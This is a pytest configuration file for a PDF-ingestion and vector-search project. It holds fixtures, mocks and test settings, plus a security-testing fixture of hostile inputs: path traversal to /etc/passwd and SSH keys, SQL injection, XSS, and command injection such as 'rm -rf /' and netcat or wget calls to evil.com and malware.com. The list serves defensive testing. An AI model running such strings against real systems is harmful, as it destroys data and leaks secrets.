"""
Global test configuration and fixtures for London School TDD

This file provides shared fixtures, test configuration, and utilities
that support the Outside-In TDD approach with proper test isolation.
"""

import pytest
import asyncio
import tempfile
import shutil
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch
from typing import AsyncGenerator, Generator, Dict, Any, List
import sqlite3
from contextlib import asynccontextmanager

# Test data factories
from tests.factories import (
    BookFactory, ChunkFactory, SearchResultFactory, 
    ConfigFactory, TestDataBuilder, TestScenarios, 
    create_temporary_pdf, cleanup_temporary_files
)


# Test Environment Setup
@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="session")
def test_data_dir():
    """Create a temporary directory for test data"""
    temp_dir = tempfile.mkdtemp(prefix="tradeknowledge_test_")
    test_dir = Path(temp_dir)
    
    # Create subdirectories
    (test_dir / "books").mkdir()
    (test_dir / "embeddings").mkdir()
    (test_dir / "databases").mkdir()
    
    yield test_dir
    
    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def temp_pdf_file(test_data_dir):
    """Create a temporary PDF file for testing"""
    pdf_content = b"%PDF-1.4\\n1 0 obj\\n<<\\n/Type /Catalog\\n/Pages 2 0 R\\n>>\\nendobj\\n"
    pdf_file = test_data_dir / "books" / "test_book.pdf"
    
    with open(pdf_file, 'wb') as f:
        f.write(pdf_content)
    
    yield pdf_file
    
    # Cleanup handled by test_data_dir fixture


# Configuration Fixtures
@pytest.fixture
def test_config():
    """Provide test configuration"""
    return {
        'embedding': {
            'model': 'test-embed-model',
            'dimension': 768,
            'batch_size': 16,
            'ollama_host': 'http://localhost:11434',
            'timeout': 10
        },
        'database': {
            'qdrant': {
                'host': 'localhost',
                'port': 6333,
                'collection_name': 'test_collection',
                'use_grpc': False
            },
            'sqlite': {
                'path': ':memory:',
                'timeout': 30
            }
        }
    }


@pytest.fixture
def embedding_config():
    """Provide test embedding configuration"""
    return ConfigFactory.create_embedding_config()


@pytest.fixture
def qdrant_config():
    """Provide test Qdrant configuration"""
    return ConfigFactory.create_qdrant_config()


@pytest.fixture
def database_config():
    """Provide test database configuration"""
    return ConfigFactory.create_database_config()


# Database Fixtures
@pytest.fixture
async def memory_sqlite_db():
    """Provide an in-memory SQLite database for testing"""
    from src.core.sqlite_storage import SQLiteStorage
    
    storage = SQLiteStorage(db_path=":memory:")
    await storage.initialize()
    
    yield storage
    
    await storage.close()


@pytest.fixture
async def mock_qdrant_client():
    """Provide a mocked Qdrant client for testing"""
    with patch('src.core.qdrant_storage.QdrantClient') as mock_client:
        # Configure the mock client
        mock_instance = AsyncMock()
        mock_client.return_value = mock_instance
        
        # Mock common operations
        mock_instance.get_collections.return_value = MagicMock(collections=[])
        mock_instance.create_collection.return_value = True
        mock_instance.upsert.return_value = MagicMock(operation_id=1)
        mock_instance.search.return_value = []
        mock_instance.count.return_value = MagicMock(count=0)
        
        yield mock_instance


@pytest.fixture
async def isolated_qdrant_storage(mock_qdrant_client, qdrant_config):
    """Provide isolated Qdrant storage for testing"""
    from src.core.qdrant_storage import QdrantStorage
    
    storage = QdrantStorage(config=qdrant_config)
    await storage.initialize()
    
    yield storage
    
    await storage.cleanup()


# Test Data Fixtures
@pytest.fixture
def sample_book():
    """Provide a sample book for testing"""
    return BookFactory()


@pytest.fixture
def sample_books():
    """Provide multiple sample books for testing"""
    return BookFactory.create_batch(5)


@pytest.fixture
def sample_chunks():
    """Provide sample chunks for testing"""
    return ChunkFactory.create_batch(10)


@pytest.fixture
def sample_embeddings():
    """Provide sample embeddings for testing"""
    return [{'chunk_id': f'chunk_{i}', 'vector': [0.1] * 768} for i in range(10)]


@pytest.fixture
def sample_search_results():
    """Provide sample search results for testing"""
    return SearchResultFactory.create_batch(5)


@pytest.fixture
def library_scenario():
    """Provide a complete library scenario for testing"""
    return TestScenarios.multiple_books_library(book_count=3, chunks_per_book=5)


@pytest.fixture
def search_scenario():
    """Provide a search scenario for testing"""
    return TestScenarios.search_scenario(result_count=10)


# Component Fixtures (Following London School TDD - Outside-In)
@pytest.fixture
async def mock_embedding_generator():
    """Provide a mocked embedding generator"""
    with patch('src.ingestion.local_embeddings.LocalEmbeddingGenerator') as mock_gen:
        mock_instance = AsyncMock()
        mock_gen.return_value = mock_instance
        
        # Mock embedding generation
        mock_instance.generate_embeddings.return_value = [
            [0.1] * 768 for _ in range(10)  # Mock 768-dim embeddings
        ]
        mock_instance.__aenter__.return_value = mock_instance
        mock_instance.__aexit__.return_value = None
        
        yield mock_instance


@pytest.fixture
def mock_pdf_parser():
    """Provide a mocked PDF parser"""
    with patch('src.ingestion.pdf_parser.PDFParser') as mock_parser:
        mock_instance = MagicMock()
        mock_parser.return_value = mock_instance
        
        # Mock PDF parsing
        mock_instance.parse_file.return_value = {
            'pages': [
                {'text': f'Page {i} content with trading strategies', 'page_num': i}
                for i in range(1, 11)
            ],
            'metadata': {
                'title': 'Test Trading Book',
                'author': 'Test Author',
                'creation_date': '2024-01-01'
            },
            'errors': []
        }
        
        yield mock_instance


@pytest.fixture
def mock_text_chunker():
    """Provide a mocked text chunker"""
    with patch('src.ingestion.text_chunker.TextChunker') as mock_chunker:
        mock_instance = MagicMock()
        mock_chunker.return_value = mock_instance
        
        # Mock text chunking
        mock_instance.chunk_pages.return_value = ChunkFactory.create_batch(10)
        
        yield mock_instance


# Security Testing Fixtures
@pytest.fixture
def malicious_inputs():
    """Provide common malicious inputs for security testing"""
    return {
        'path_traversal': [
            '../../../etc/passwd',
            '../../home/user/.ssh/id_rsa',
            '~/../../etc/hosts',
            'data/../../../secret.txt'
        ],
        'sql_injection': [
            "'; DROP TABLE chunks; --",
            "test UNION SELECT * FROM chunks",
            "test; DELETE FROM books;",
            "exec xp_cmdshell 'dir'"
        ],
        'xss_attempts': [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>"
        ],
        'command_injection': [
            "test`rm -rf /`",
            "test;cat /etc/passwd",
            "test|netcat evil.com",
            "test&wget malware.com"
        ]
    }


# Performance Testing Fixtures
@pytest.fixture
def performance_test_data():
    """Provide large datasets for performance testing"""
    return {
        'large_library': TestScenarios.multiple_books_library(
            book_count=50, chunks_per_book=100
        ),
        'complex_search': TestScenarios.search_scenario(result_count=1000)
    }


# Utility Fixtures
@pytest.fixture
def mock_external_services():
    """Mock all external service dependencies"""
    with patch.multiple(
        'src.core',
        # Mock external APIs
        httpx=AsyncMock(),
        # Mock file system operations
        pathlib=MagicMock(),
        # Mock Redis
        redis=MagicMock()
    ):
        yield


@pytest.fixture
def capture_logs():
    """Capture logs during test execution"""
    import logging
    from io import StringIO
    
    log_capture = StringIO()
    handler = logging.StreamHandler(log_capture)
    logger = logging.getLogger('tradeknowledge')
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)
    
    yield log_capture
    
    logger.removeHandler(handler)


# Integration Test Fixtures
@pytest.fixture(scope="class")
async def integration_test_setup():
    """Setup for integration tests that require real services"""
    # Only run if explicitly requested
    if not pytest.config.getoption("--integration"):
        pytest.skip("Integration tests require --integration flag")
    
    # Setup real test database, Qdrant instance, etc.
    # This would be used for end-to-end testing
    pass


# Cleanup Fixtures
@pytest.fixture(autouse=True)
def cleanup_after_test():
    """Automatic cleanup after each test"""
    created_files = []
    
    yield created_files
    
    # Cleanup any files that were created during the test
    cleanup_temporary_files(created_files)


# Custom Pytest Markers and Configuration
def pytest_configure(config):
    """Configure custom pytest markers"""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow running"
    )
    config.addinivalue_line(
        "markers", "integration: marks tests as integration tests"
    )
    config.addinivalue_line(
        "markers", "security: marks tests as security tests"
    )
    config.addinivalue_line(
        "markers", "performance: marks tests as performance tests"
    )


def pytest_addoption(parser):
    """Add custom command line options"""
    parser.addoption(
        "--integration",
        action="store_true",
        default=False,
        help="run integration tests that require external services"
    )
    parser.addoption(
        "--performance",
        action="store_true", 
        default=False,
        help="run performance tests"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection based on command line options"""
    if not config.getoption("--integration"):
        skip_integration = pytest.mark.skip(reason="need --integration option to run")
        for item in items:
            if "integration" in item.keywords:
                item.add_marker(skip_integration)
    
    if not config.getoption("--performance"):
        skip_performance = pytest.mark.skip(reason="need --performance option to run")
        for item in items:
            if "performance" in item.keywords:
                item.add_marker(skip_performance)


# London School TDD Support Functions
class TestContext:
    """Context manager for London School TDD test scenarios"""
    
    def __init__(self):
        self.mocks = {}
        self.data = {}
        self.cleanup_tasks = []
    
    def mock_component(self, component_name: str, mock_obj: Any):
        """Register a mock component"""
        self.mocks[component_name] = mock_obj
        return mock_obj
    
    def add_test_data(self, data_name: str, data: Any):
        """Add test data to the context"""
        self.data[data_name] = data
    
    def add_cleanup_task(self, task):
        """Add a cleanup task to be run after the test"""
        self.cleanup_tasks.append(task)
    
    async def cleanup(self):
        """Run all cleanup tasks"""
        for task in self.cleanup_tasks:
            if asyncio.iscoroutinefunction(task):
                await task()
            else:
                task()


@pytest.fixture
def test_context():
    """Provide a test context for London School TDD"""
    context = TestContext()
    yield context
    asyncio.create_task(context.cleanup())